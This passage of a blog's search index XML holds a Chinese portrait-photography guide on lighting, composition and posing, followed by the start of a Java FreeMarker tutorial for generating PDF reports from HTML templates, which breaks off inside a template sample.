<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>摄影基础</title>
    <link href="/2023/12/26/%E6%91%84%E5%BD%B1%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/12/26/%E6%91%84%E5%BD%B1%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、人像摄影"><a href="#一、人像摄影" class="headerlink" title="一、人像摄影"></a>一、人像摄影</h1><h2 id="光线"><a href="#光线" class="headerlink" title="光线"></a>光线</h2><h3 id="1-顺光"><a href="#1-顺光" class="headerlink" title="1. 顺光"></a>1. 顺光</h3><ul><li>拍摄时间：上午十点前，下午三点后</li></ul><h3 id="2-逆光"><a href="#2-逆光" class="headerlink" title="2. 逆光"></a>2. 逆光</h3><h4 id="2-1-正确测光步骤"><a href="#2-1-正确测光步骤" class="headerlink" title="2.1 正确测光步骤"></a>2.1 正确测光步骤</h4><ul><li>先测环境光：点测光，测高光，确保画面不大面积过曝，看直方图，过渡自然舒服，确定参数</li><li>人物曝光：通过反光板补光，侧面略高于人像45度，轮廓突出下巴</li></ul><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1703597406292.png" alt="1703597406292"></p><h3 id="3-测光"><a href="#3-测光" class="headerlink" title="3. 测光"></a>3. 测光</h3><blockquote><p>层次感强，脸圆偏胖，不适合测光，逆光侧仍然需要补光</p></blockquote><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1703597375976.png" alt="1703597375976"></p><h3 id="4-柔光"><a href="#4-柔光" class="headerlink" title="4. 柔光"></a>4. 柔光</h3><blockquote><p>柔光镜，丝袜，塑料薄膜，达到半透明效果即可</p></blockquote><p>关键点：人脸受强光时</p><h2 id="色调"><a href="#色调" class="headerlink" title="色调"></a>色调</h2><h3 id="1-冷暖对比"><a href="#1-冷暖对比" class="headerlink" title="1. 冷暖对比"></a>1. 冷暖对比</h3><ul><li>蓝调时刻：太阳刚刚落山——冷色，补光（三色手电筒）——暖色</li></ul><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1703597878509.png" alt="1703597878509"></p><h2 id="构图"><a href="#构图" class="headerlink" title="构图"></a>构图</h2><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705222226869.png" alt="1705222226869"></p><h3 id="点构图"><a href="#点构图" class="headerlink" title="点构图"></a>点构图</h3><h4 id="中心点构图"><a href="#中心点构图" class="headerlink" title="中心点构图"></a>中心点构图</h4><p>顾名思义，中心突出主体，缺点是画面平庸、单调</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221148742.png" alt="1705221148742"></p><h4 id="引导点构图"><a href="#引导点构图" class="headerlink" title="引导点构图"></a>引导点构图</h4><p>利用镜头的透视，场景中带有指向性的线条，适合拍地铁、马路、建筑等题材</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221282333.png" alt="1705221282333"></p><h3 id="线构图"><a href="#线构图" class="headerlink" title="线构图"></a>线构图</h3><p>画面当中存在一条明显的对角分界线，在拍人像全身或者半身照时，会显得主体更高，腿更长</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221414914.png" alt="1705221414914"></p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221483200.png" alt="1705221483200"></p><h3 id="三分线构图"><a href="#三分线构图" class="headerlink" title="三分线构图"></a>三分线构图</h3><p>将画面三等分，可以尝试把主体放置分割线交点上，有突出主体的效果，对比中心构图，画面不至过于平庸单调</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221576087.png" alt="1705221576087"></p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221608757.png" alt="1705221608757"></p><p>拍摄人像时，将人物放置三分线交点上，人朝向空白区域，有平衡画面，引导视觉，加强意境等效果</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221781263.png" alt="1705221781263"></p><h3 id="前景构图"><a href="#前景构图" class="headerlink" title="前景构图"></a>前景构图</h3><p>利用一些元素放置在离镜头比较近的位置，比如树叶、小花小草等作为前景，以衬托主体、营造氛围感、引导视线，增加画面的层次感，还可以利用前景挡住画面中杂乱或者不希望入画的元素</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705222090822.png" alt="1705222090822"></p><h2 id="摆姿"><a href="#摆姿" class="headerlink" title="摆姿"></a>摆姿</h2><blockquote><p>摆姿是人像摄影中非常重要的环节，一个好看的摆姿会让模特展示出很好的身形和角度，也能避免模特自身的缺点，不好的摆姿则会让观众看的非常别扭，把模特自身的缺点无限放大，传递不出画面意境</p></blockquote><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705221047567.png" alt="1705221047567"></p><h4 id="抓拍"><a href="#抓拍" class="headerlink" title="抓拍"></a>抓拍</h4><p>模特做一整套连贯动作，才能保证动作自然。比如手拨头发，不可能直接让人把手放到耳朵上，这样动作时僵硬的，神情也会不自然</p><h4 id="让眼神变自然"><a href="#让眼神变自然" class="headerlink" title="让眼神变自然"></a>让眼神变自然</h4><p>大部分人不具备天生的镜头感，选择让模特一开始不看镜头，以一个第三视角去捕捉模特的自然动态，等模特慢慢适应了镜头拍摄的状态后，就可以让模特过渡到看镜头的画面了，</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705222829929.png" alt="1705222829929"></p><p>一开始可以让模特闭着眼，做好取景构图后，再让她慢慢睁开眼看向镜头。</p><h4 id="让嘴唇放轻松"><a href="#让嘴唇放轻松" class="headerlink" title="让嘴唇放轻松"></a>让嘴唇放轻松</h4><p>如果拍照时嘴巴抿得太紧，很容易出现紧绷感，可以尝试让模特先微微张开双唇，逐步找到放松的状态，根据模特牙齿的状况决定牙齿露出的程度，平时也可以对着镜子练习松弛的面部笑容，找到最适合自身的唇齿状态</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705224498978.png" alt="1705224498978"></p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705224519726.png" alt="1705224519726"></p><h4 id="无处安放的小手"><a href="#无处安放的小手" class="headerlink" title="无处安放的小手"></a>无处安放的小手</h4><p>别让模特手闲着，可以拿点道具（结合场景有的物品、包包、奶茶、栏杆等），自然就不会觉得手不知道往哪里放，然后手足无措</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705222953251.png" alt="1705222953251"></p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705222970755.png" alt="1705222970755"></p><h4 id="低机位拍摄"><a href="#低机位拍摄" class="headerlink" title="低机位拍摄"></a>低机位拍摄</h4><p>将机位放低，从下往上拍，就算不用广角镜头，也可以让照片中的腿部比例显得更修长，达到视觉拉腿的效果，</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705224791659.png" alt="1705224791659"></p><p>机位放在腹部左右的位置，对上半身也会比例拉伸的效果，显得更加修长</p><p><img src="/../blog-assets/%E9%95%BF%E7%84%A6%E6%91%84%E5%BD%B1/1705224806154.png" alt="1705224806154"></p>]]></content>
    
    
    <categories>
      
      <category>爱好</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摄影</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>按模板自动化生成PDF</title>
    <link href="/2023/08/01/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/"/>
    <url>/2023/08/01/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文将阐述一种纯Java后端实现<strong>按模板自动化生成</strong><code>PDF</code>的方法，适用于<strong>周期性报表</strong>、<strong>数据分析报告</strong>生成等场景。</p><h2 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h2><p><img src="/../blog-assets/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/%E6%8C%89%E6%A8%A1%E6%9D%BF%E8%87%AA%E5%8A%A8%E5%8C%96%E7%94%9F%E6%88%90pdf.png" alt="按模板自动化生成pdf"></p><h2 id="Demo示例"><a href="#Demo示例" class="headerlink" title="Demo示例"></a>Demo示例</h2><p><img src="/../blog-assets/%E6%8C%89%E6%A8%A1%E6%9D%BF%E7%94%9F%E6%88%90PDF/demo.png" alt="demo"></p><h1 id="一、使用FreeMarker按模板生成HTML"><a href="#一、使用FreeMarker按模板生成HTML" class="headerlink" title="一、使用FreeMarker按模板生成HTML"></a>一、使用FreeMarker按模板生成HTML</h1><p>拿到需求方提供的模板文件后，我们首先需要将模板转换为 <code>Free Marker</code> 能够识别的<code>FTL</code>模板。</p><h2 id="1-1-什么是-FreeMarker"><a href="#1-1-什么是-FreeMarker" class="headerlink" title="1.1 什么是 FreeMarker"></a>1.1 什么是 <code>FreeMarker</code></h2><p><code>FreeMarker</code>是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 是一个Java类库。</p><blockquote><p>详细概述及语法请参考：<a href="https://blog.csdn.net/weixin_44454512/article/details/109877418?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169189879016800186523127%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169189879016800186523127&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-109877418-null-null.142%5Ev92%5Ekoosearch_v1&utm_term=FreeMarker&spm=1018.2226.3001.4187">FreeMarker详细介绍</a></p></blockquote><h2 id="1-2-依赖引入"><a href="#1-2-依赖引入" class="headerlink" title="1.2 依赖引入"></a>1.2 依赖引入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- free marker 模板--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-3-模板文件准备"><a href="#1-3-模板文件准备" class="headerlink" title="1.3 模板文件准备"></a>1.3 模板文件准备</h2><blockquote><p>该流程需读者掌握<code>HTML</code>、<code>CSS</code>及<code>FTL</code>的基础知识</p></blockquote><p>在该步骤中， 需将模板源文件（<code>WORD</code>，<code>PDF</code>等格式）依据<code>FreeMarker</code>语法转换为<code>FTL</code>模板前置<code>HTML</code>格式，示例模板 <code>cover.ftl</code> 如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        * &#123;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">            <span class="hljs-attribute">box-sizing</span>: border-box;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">font-family</span>: SimSun, fangsong;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">section</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span> <span class="hljs-number">10px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.title</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">section</span> <span class="hljs-selector-tag">h1</span> <span class="hljs-selector-tag">h2</span> <span class="hljs-selector-tag">h3</span> <span class="hljs-selector-tag">h4</span> <span class="hljs-selector-tag">h5</span> <span class="hljs-selector-tag">h6</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">border-right</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-collapse</span>: collapse;</span><br><span class="language-css">            <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">13px</span>;</span><br><span class="language-css">            <span class="hljs-comment">/* 表格分页直接换到下一页*/</span></span><br><span class="language-css">            <span class="hljs-comment">/*page-break-before: always;*/</span></span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">caption</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2em</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-weight</span>: bold;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">th</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">border-left</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-collapse</span>: collapse;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">td</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">border-left</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-collapse</span>: collapse;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">tr</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#008c8c</span>;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">tr</span><span class="hljs-selector-pseudo">:nth-child</span>(odd) &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#eee</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">tr</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ccc</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">tfoot</span> <span class="hljs-selector-tag">tr</span> <span class="hljs-selector-tag">td</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">text-align</span>: right;</span><br><span class="language-css">            <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">            <span class="hljs-comment">/*分页时表格行换行*/</span></span><br><span class="language-css">            <span class="hljs-attribute">page-break-inside</span>: avoid <span class="hljs-meta">!important</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">tr</span> &#123;</span><br><span class="language-css">            <span class="hljs-comment">/* 表格分页,只有行换到下一页 */</span></span><br><span class="language-css">            <span class="hljs-attribute">page-break-inside</span>: avoid <span class="hljs-meta">!important</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-id">#period</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#f40</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-id">#schoolTimeTable</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">60%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">20%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20%</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css"></span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>2021-2022学年第一学期高一英语教学计划<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>本学期的指导思想<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        1、坚定不移的遵循新教育理念，突出学生主体，让学生成为学习的主人<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><br>        2、面向全体学生，关注每个学生的情感，激发他们学习英语的兴趣，帮助他们建立学习的成就感和自信心。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><br>        3、尊重个体差异，让学生在老师的指导下构建知识，提高技能，磨练意志，活跃思维，展现个性，发展心智和拓展视野;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><br>        4、让学生在使用英语中学习英语，让学生成为 Good User而不仅仅是 Learner。让他们在使用和学习英语的过程中，体味到轻松和成功的快乐。<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;line-height: 30px&quot;</span>&gt;</span>本学期的重点工作<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;line-height: 30px&quot;</span>&gt;</span>（一）全面做好初高中衔接工作<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        初中和高中在教学对象、教学内容、教学要求、教学方式和学习方式方面均存在着一定的差异，因此，帮助高一新生了解这些差异，引导他们尽快适应高中的学习与生活。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;line-height: 30px&quot;</span>&gt;</span>（二）优化使用新教材，精编学案<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>        一方面，对于新教材，要做到学习教材，研究教材，理解教材各个栏日的编写意图，最大限度地发挥各个栏目的作用。另一方面要要根据教学目标和课时及学生实际对其进行大胆的取舍和重组，是教材为我所用，而不是被教材牵着鼻子走。变“教教材”为“用教材教”。教师在教学时应根据本班学生的实际情况，运用可行的教学策略，引导学生参与讨论解题的过程、思路和方法，培养和训练学生对问题的思辩能力。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;schoolTimeTable&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">caption</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center&quot;</span>&gt;</span>光明中学2023秋季学期课表<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;15%&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left;margin-top:10%;margin-left:10%&quot;</span>&gt;</span>时段<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:right;margin-bottom:10%;margin-right:10%&quot;</span>&gt;</span>星期<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;17%&quot;</span>&gt;</span>周一<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;17%&quot;</span>&gt;</span>周二<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;17%&quot;</span>&gt;</span>周三<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;17%&quot;</span>&gt;</span>周四<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;17%&quot;</span>&gt;</span>周五<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span 